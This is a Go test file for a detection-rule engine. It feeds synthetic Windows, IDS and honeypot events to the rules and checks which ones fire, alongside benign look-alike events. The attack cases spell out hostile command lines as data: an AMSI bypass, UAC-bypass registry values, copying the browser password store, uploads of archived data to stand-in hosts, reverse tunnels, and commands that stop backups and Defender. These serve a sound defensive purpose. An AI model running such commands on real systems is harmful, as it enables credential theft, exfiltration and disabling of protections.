package rules

import (
	"slices"
	"testing"
	"time"

	"github.com/Ruby570bocadito/bluetardigrade/pkg/model"
)

// Coverage pack (initial access, privilege escalation, collection,
// exfiltration, discovery, lateral movement, C2, evasion, impact,
// reconnaissance): every rule fires on its attack case with exactly the
// expected rule set (overlaps are listed on purpose), and stays quiet on
// the benign twin an analyst would otherwise have to suppress.

func proc(name, image, cmdline, parent string) *model.Event {
	ev := &model.Event{
		ID: "cov", Timestamp: time.Now().UTC(), Type: model.TypeProcessCreate,
		Source: "sysmon", Host: "LAB-WKS-01", User: `CORP\jdoe`,
		Process: &model.Process{PID: 1000, PPID: 900, Name: name, CommandLine: cmdline, Image: image},
	}
	if image == "" {
		ev.Process.Image = `C:\Windows\System32\` + name
	}
	if parent != "" {
		ev.Enrichment = map[string]string{"parent_name": parent}
	}
	return ev
}

func reg(key, valueName, value string) *model.Event {
	return &model.Event{
		ID: "cov-reg", Timestamp: time.Now().UTC(), Type: model.TypeRegistrySet, Source: "sysmon", Host: "LAB-WKS-01",
		Process:  &model.Process{PID: 1000, Name: "reg.exe"},
		Registry: &model.Registry{Key: key, ValueName: valueName, Value: value, Operation: "SetValue"},
	}
}

func fileWrite(writer, path string) *model.Event {
	return &model.Event{
		ID: "cov-file", Timestamp: time.Now().UTC(), Type: model.TypeFileWrite, Source: "sysmon", Host: "LAB-WKS-01",
		Process: &model.Process{PID: 1000, Name: writer},
		File:    &model.File{Path: path},
	}
}

func connect(name string, port int) *model.Event {
	return &model.Event{
		ID: "cov-net", Timestamp: time.Now().UTC(), Type: model.TypeNetworkConnect, Source: "sysmon", Host: "LAB-WKS-01",
		Process: &model.Process{PID: 1000, Name: name},
		Network: &model.Network{Protocol: "tcp", DestinationIP: "203.0.113.7", DestinationPort: port},
	}
}

func hitNames(e *Engine, ev *model.Event) []string {
	var names []string
	for _, h := range e.Evaluate(ev) {
		names = append(names, h.Rule.Name)
	}
	slices.Sort(names)
	return names
}

func TestCoveragePackAttackCases(t *testing.T) {
	e := loadTestEngine(t)
	cases := []struct {
		name string
		ev   *model.Event
		want []string
	}{
		{"webshell", proc("cmd.exe", "", `cmd.exe /c whoami /all`, "w3wp.exe"),
			[]string{"Proceso hijo de un servidor web o de base de datos"}},
		{"xp_cmdshell", proc("powershell.exe", "", `powershell.exe -c "Get-Process"`, "sqlservr.exe"),
			[]string{"Proceso hijo de un servidor web o de base de datos"}},
		{"outlook attachment", proc("factura.exe", `C:\Users\jdoe\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\X1Y2Z3\factura.exe`, `"factura.exe"`, "outlook.exe"),
			[]string{"Ejecutable lanzado desde un adjunto o un archivo comprimido"}},
		{"zip double click", proc("update.exe", `C:\Users\jdoe\AppData\Local\Temp\Temp1_pedido.zip\update.exe`, `"update.exe"`, "explorer.exe"),
			[]string{"Ejecutable lanzado desde un adjunto o un archivo comprimido"}},
		{"equation editor", proc("cmd.exe", "", `cmd.exe /c powershell -nop -c iex`, "eqnedt32.exe"),
			[]string{"Exploit de Office via Equation Editor"}},
		{"scr from downloads", proc("foto.scr", `C:\Users\jdoe\Downloads\foto.scr`, `"foto.scr" /S`, "explorer.exe"),
			[]string{"Formato ejecutable inusual lanzado desde Descargas"}},
		{"fodhelper", reg(`HKCU\Software\Classes\ms-settings\shell\open\command`, "(Default)", `cmd.exe /c start payload.exe`),
			[]string{"Bypass de UAC con fodhelper o computerdefaults"}},
		{"eventvwr", reg(`HKCU\Software\Classes\mscfile\shell\open\command`, "(Default)", `C:\Users\Public\p.exe`),
			[]string{"Bypass de UAC con eventvwr, sdclt o la clase Folder"}},
		{"ifeo debugger", reg(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "Debugger", `C:\Windows\System32\cmd.exe`),
			[]string{"Depurador en Image File Execution Options"}},
		{"sticky keys", fileWrite("cmd.exe", `C:\Windows\System32\sethc.exe`),
			[]string{"Sustitucion de binarios de accesibilidad"}},
		{"godpotato", proc("godpotato.exe", `C:\Users\Public\GodPotato.exe`, `C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"`, ""),
			[]string{"Escalada por suplantacion de token (Potato, PrintSpoofer)"}},
		{"service in user path", proc("sc.exe", "", `sc.exe create updsvc binPath= "C:\Users\Public\svc.exe" start= auto`, ""),
			[]string{"Servicio nuevo con binario en ruta de usuario"}},
		{"new-service", proc("powershell.exe", "", `powershell.exe New-Service -Name upd -BinaryPathName C:\ProgramData\upd.exe`, ""),
			[]string{"Servicio nuevo con binario en ruta de usuario"}},
		{"7z password", proc("7z.exe", "", `7z.exe a -pS3cret! -mhe=on C:\Users\Public\out.7z C:\Users\jdoe\Documents`, ""),
			[]string{"Compresion de datos protegida con contrasena"}},
		{"rar password", proc("rar.exe", "", `rar.exe a -hpS3cret C:\ProgramData\d.rar C:\Shares\Finanzas`, ""),
			[]string{"Compresion de datos protegida con contrasena"}},
		{"screen capture", proc("powershell.exe", "", `powershell.exe -c "$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size)"`, ""),
			[]string{"Captura de pantalla desde PowerShell"}},
		{"clipboard", proc("powershell.exe", "", `powershell.exe -c Get-Clipboard | Out-File C:\Users\Public\c.txt`, ""),
			[]string{"Lectura del portapapeles desde la linea de comandos"}},
		{"browser store", proc("cmd.exe", "", `cmd.exe /c copy "C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Users\Public\ld.db`, ""),
			[]string{"Acceso a contrasenas y cookies del navegador"}},
		{"pst copy", proc("robocopy.exe", "", `robocopy.exe C:\Users\jdoe\Documents\Outlook C:\Users\Public\x jdoe.pst`, ""),
			[]string{"Copia de buzones de correo locales (PST/OST)"}},
		{"rclone", proc("rclone.exe", "", `rclone.exe copy C:\Users\Public\out mega:backup -q`, ""),
			[]string{"Exfiltracion con rclone"}},
		{"curl upload", proc("curl.exe", "", `curl.exe -T C:\Users\Public\out.7z https://transfer.example/out.7z`, ""),
			[]string{"Subida de ficheros con curl o PowerShell"}},
		{"iwr upload", proc("powershell.exe", "", `powershell.exe Invoke-WebRequest -Uri https://x.example/u -Method Post -InFile C:\Users\Public\out.7z`, ""),
			[]string{"Subida de ficheros con curl o PowerShell"}},
		{"bits upload", proc("bitsadmin.exe", "", `bitsadmin.exe /transfer job /upload https://x.example/u C:\Users\Public\out.7z`, ""),
			[]string{"Descarga con certutil o bitsadmin", "Subida de ficheros con bitsadmin"}},
		{"ftp script", proc("ftp.exe", "", `ftp.exe -i -s:C:\Users\Public\cmds.txt`, ""),
			[]string{"Transferencia FTP con guion de comandos"}},
		{"recon from office", proc("whoami.exe", "", `whoami.exe /all`, "winword.exe"),
			[]string{"Reconocimiento lanzado desde un proceso sospechoso"}},
		{"av inventory", proc("wmic.exe", "", `wmic.exe /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName`, ""),
			[]string{"Inventario del antivirus instalado"}},
		{"setspn", proc("setspn.exe", "", `setspn.exe -T corp.local -Q */*`, ""),
			[]string{"Enumeracion de SPN con setspn"}},
		{"nmap", proc("nmap.exe", "", `nmap -sS 10.0.0.0/24`, ""),
			[]string{"Escaner de red o de puertos en el equipo"}},
		{"sc remote", proc("sc.exe", "", `sc.exe \\LAB-WKS-02 create evil binPath= "C:\Windows\Temp\x.exe"`, ""),
			[]string{"Servicio nuevo con binario en ruta de usuario", "Servicio remoto creado o arrancado con sc"}},
		{"winrm", proc("powershell.exe", "", `powershell.exe Invoke-Command -ComputerName LAB-WKS-02 -ScriptBlock {whoami}`, ""),
			[]string{"Ejecucion remota con WinRM o PowerShell Remoting"}},
		{"rdp enabled", reg(`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`, "fDenyTSConnections", "DWORD (0x00000000)"),
			[]string{"Escritorio remoto habilitado por registro"}},
		{"ngrok", proc("ngrok.exe", "", `ngrok.exe tcp 3389`, ""),
			[]string{"Tunel o proxy inverso hacia el exterior"}},
		{"plink reverse", proc("plink.exe", "", `plink.exe -ssh op@203.0.113.5 -R 8080:127.0.0.1:3389`, ""),
			[]string{"Tunel o proxy inverso hacia el exterior"}},
		{"c2 port", connect("powershell.exe", 4444),
			[]string{"Interprete conectando a un puerto tipico de C2"}},
		{"rustdesk", proc("rustdesk.exe", `C:\Users\jdoe\Downloads\rustdesk.exe`, `rustdesk.exe --service`, ""),
			[]string{"Herramienta de acceso remoto en el equipo"}},
		{"amsi bypass", proc("powershell.exe", "", `powershell.exe -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"`, ""),
			[]string{"Bypass de AMSI en PowerShell"}},
		{"wmi subscription", proc("powershell.exe", "", `powershell.exe Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='upd'}`, ""),
			[]string{"Suscripcion permanente de eventos WMI"}},
		{"ps history", proc("powershell.exe", "", `powershell.exe Set-PSReadlineOption -HistorySaveStyle SaveNothing`, ""),
			[]string{"Borrado del historial de PowerShell"}},
		{"scriptblock logging off", reg(`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`, "EnableScriptBlockLogging", "DWORD (0x00000000)"),
			[]string{"Registro de bloques de PowerShell desactivado"}},
		{"findstr passwords", proc("findstr.exe", "", `findstr.exe /si password *.xml *.ini *.txt`, ""),
			[]string{"Busqueda de contrasenas en ficheros"}},
		{"stop backups", proc("net.exe", "", `net.exe stop VSS /y`, ""),
			[]string{"Detencion de servicios de copia de seguridad o de seguridad"}},
		{"disable defender service", proc("sc.exe", "", `sc.exe config WinDefend start= disabled`, ""),
			[]string{"Detencion de servicios de copia de seguridad o de seguridad"}},
		{"cipher wipe", proc("cipher.exe", "", `cipher.exe /w:C:\`, ""),
			[]string{"Borrado seguro del espacio libre con cipher"}},
		{"ransom note", fileWrite("svchost.exe", `C:\Users\jdoe\Documents\HOW_TO_DECRYPT_FILES.txt`),
			[]string{"Nota de rescate escrita en disco"}},
		{"ids scan", &model.Event{ID: "cov-ids", Timestamp: time.Now().UTC(), Type: model.TypeNetworkAlert, Source: "suricata", Host: "IDS-01",
			Attributes: map[string]string{"ids_signature": "ET SCAN Nmap Scripting Engine User-Agent Detected", "ids_priority": "2"}},
			[]string{"IDS: escaneo activo de red", "Suricata: firma de prioridad media"}},
		{"cowrie recon", &model.Event{ID: "cov-cowrie", Timestamp: time.Now().UTC(), Type: "honeypot.command", Source: "cowrie", Host: "HONEYPOT-01",
			Attributes: map[string]string{"honeypot_input": "uname -a"}},
			[]string{"Cowrie: reconocimiento del sistema en el honeypot"}},
	}
	for _, tc := range cases {
		got := hitNames(e, tc.ev)
		want := slices.Clone(tc.want)
		slices.Sort(want)
		if !slices.Equal(got, want) {
			t.Errorf("%s: hits %q, want %q", tc.name, got, want)
		}
	}
}

func TestCoveragePackBenignTwins(t *testing.T) {
	e := loadTestEngine(t)
	for name, ev := range map[string]*model.Event{
		"7z extract with password": proc("7z.exe", "", `7z.exe x invoice.7z -pS3cret -oC:\Users\jdoe\Documents`, ""),
		"curl download":            proc("curl.exe", "", `curl.exe -O https://example.com/file.zip`, ""),
		"sc query":                 proc("sc.exe", "", `sc.exe query wuauserv`, ""),
		"service in program files": proc("sc.exe", "", `sc.exe create agent binPath= "C:\Program Files\Agent\agent.exe"`, ""),
		"net stop spooler":         proc("net.exe", "", `net.exe stop Spooler`, ""),
		"installer readme":         fileWrite("msiexec.exe", `C:\Program Files\App\README.txt`),
		"windows update sethc":     fileWrite("TiWorker.exe", `C:\Windows\System32\sethc.exe`),
		"rdp disabled":             reg(`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`, "fDenyTSConnections", "DWORD (0x00000001)"),
		"https from powershell":    connect("powershell.exe", 443),
		"whoami from a console":    proc("whoami.exe", "", `whoami.exe`, "cmd.exe"),
		"chrome opening its store": proc("chrome.exe", `C:\Program Files\Google\Chrome\Application\chrome.exe`, `chrome.exe --profile-directory=Default "Login Data"`, "explorer.exe"),
		"local powershell session": proc("powershell.exe", "", `powershell.exe Invoke-Command -ScriptBlock {Get-Date}`, ""),
		"exe from downloads":       proc("setup.exe", `C:\Users\jdoe\Downloads\setup.exe`, `"setup.exe"`, "explorer.exe"),
		"cmd from a normal parent": proc("cmd.exe", "", `cmd.exe /c dir`, "explorer.exe"),
	} {
		if got := hitNames(e, ev); len(got) != 0 {
			t.Errorf("benign %s fired %q", name, got)
		}
	}
}
